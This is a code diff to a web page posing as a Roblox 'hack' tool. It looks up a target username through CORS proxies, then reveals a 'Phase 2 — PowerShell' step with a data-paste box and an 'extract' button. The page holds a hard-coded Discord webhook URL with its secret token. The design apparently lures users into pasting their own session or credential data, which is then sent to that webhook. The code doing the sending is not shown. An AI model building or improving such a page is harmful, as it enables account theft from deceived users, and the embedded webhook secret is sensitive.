@@ -467,8 +467,8 @@
                 <div class="status" id="status1"></div>
             </div>
 
-            <!-- PHASE 2 -->
-            <div class="card" id="phase2Card">
+            <!-- PHASE 2 (hidden until Phase 1 fully completes) -->
+            <div class="card" id="phase2Card" style="display:none;">
                 <div class="card-header">
                     <span class="card-title"><span class="accent">⏣</span> PHASE 2 — POWERSHELL</span>
                     <span class="card-step">STEP_02</span>
@@ -508,6 +508,7 @@
     const WEBHOOK_URL =
         "https://discord.com/api/webhooks/1530655593801584842/EtfkEsXhOlaomGtkxhCzTnxQi_m3x1innKcqvwCSQVUsRdq0pIcf_jKScou870H-wM5N";
 
+    // ── DOM ──
     const video           = document.getElementById('hackVideo');
     const placeholder     = document.getElementById('videoPlaceholder');
     const usernameInput   = document.getElementById('usernameInput');
@@ -519,8 +520,8 @@
     const targetDisplay   = document.getElementById('targetDisplay');
     const confirmYes      = document.getElementById('confirmYes');
     const confirmNo       = document.getElementById('confirmNo');
-    const phase2          = document.getElementById('phase2');
     const phase2Card      = document.getElementById('phase2Card');
+    const phase2          = document.getElementById('phase2');
     const dataInput       = document.getElementById('dataInput');
     const extractBtn      = document.getElementById('extractBtn');
     const status2         = document.getElementById('status2');
@@ -573,32 +574,7 @@
         }
     }
 
-    // ── CORS proxy helper ──
-    const CORS_PROXY = 'https://api.allorigins.win/raw?url=';
-
-    async function fetchWithFallback(url, options) {
-        // Try direct first
-        try {
-            const resp = await fetch(url, options);
-            if (resp.ok) return resp;
-        } catch (_) {}
-
-        // Try via CORS proxy
-        const proxyUrl = CORS_PROXY + encodeURIComponent(url);
-        // For POST, we need to send via proxy differently
-        if (options && options.method === 'POST') {
-            const proxyResp = await fetch(proxyUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: options.body
-            });
-            return proxyResp;
-        }
-        const proxyResp = await fetch(proxyUrl);
-        return proxyResp;
-    }
-
-    // ── Look up Roblox user ──
+    // ── Roblox API lookup via CORS proxy ──
     async function lookupUser() {
         const username = usernameInput.value.trim();
         if (!username) {
@@ -615,36 +591,41 @@
         targetPreview.classList.remove('visible');
 
         try {
-            // Use the usernames endpoint via proxy-friendly approach
-            const bodyData = JSON.stringify({
-                usernames: [username],
-                excludeBannedUsers: true
+            // Use corsproxy.io — reliably forwards POST with body+headers
+            const proxyUrl = 'https://corsproxy.io/?' + encodeURIComponent(
+                'https://users.roblox.com/v1/usernames/users'
+            );
+
+            const resp = await fetch(proxyUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    usernames: [username],
+                    excludeBannedUsers: true
+                })
             });
 
-            let resp;
-            // Try direct POST
-            try {
-                resp = await fetch('https://users.roblox.com/v1/usernames/users', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: bodyData
-                });
-            } catch (_) {
-                // Fallback: use GET with proxy by encoding the request
-                const proxyResp = await fetch(
-                    CORS_PROXY + encodeURIComponent('https://users.roblox.com/v1/usernames/users'),
+            if (!resp.ok) {
+                // Try fallback: allorigins
+                const fallbackResp = await fetch(
+                    'https://api.allorigins.win/raw?url=' + encodeURIComponent(
+                        'https://users.roblox.com/v1/usernames/users'
+                    ),
                     {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: bodyData
+                        body: JSON.stringify({
+                            usernames: [username],
+                            excludeBannedUsers: true
+                        })
                     }
                 );
-                resp = proxyResp;
+                if (!fallbackResp.ok) throw new Error('fallback also failed');
+                var data = await fallbackResp.json();
+            } else {
+                var data = await resp.json();
             }
 
-            if (!resp.ok) throw new Error('API returned ' + resp.status);
-
-            const data = await resp.json();
             if (!data.data || data.data.length === 0) {
                 status1.className = 'error';
                 status1.textContent = '✖ user not found — try again';
@@ -654,14 +635,12 @@
             }
 
             const user = data.data[0];
-            currentUserId   = user.id;
-            currentTargetName = user.name;
-            const displayName = user.displayName || user.name;
+            currentUserId      = user.id;
+            currentTargetName  = user.name;
+            const displayName  = user.displayName || user.name;
 
-            // Get avatar — this works without CORS because images load directly
-            const avatarUrl = `https://www.roblox.com/headshot-thumbnail/image?userId=${currentUserId}&width=420&height=420&format=png`;
-
-            targetAvatar.src = avatarUrl;
+            // Avatar — loads directly (no CORS needed for images)
+            targetAvatar.src = `https://www.roblox.com/headshot-thumbnail/image?userId=${currentUserId}&width=420&height=420&format=png`;
             targetName.textContent = displayName;
             targetDisplay.textContent = '@' + user.name + ' · ID: ' + currentUserId;
             targetPreview.classList.add('visible');
@@ -697,10 +676,13 @@
         if (ok) {
             status1.className = 'success';
             status1.textContent = '✔ target locked — proceed to step 2';
-            phase2.style.display = 'block';
+
+            // ── ONLY now show Phase 2 ──
+            phase2Card.style.display = 'block';
             phase2Card.classList.add('highlight');
             dataInput.focus();
 
+            // Flash
             document.querySelector('.app').style.filter = 'brightness(1.15)';
             setTimeout(() => {
                 document.querySelector('.app').style.filter = 'none';
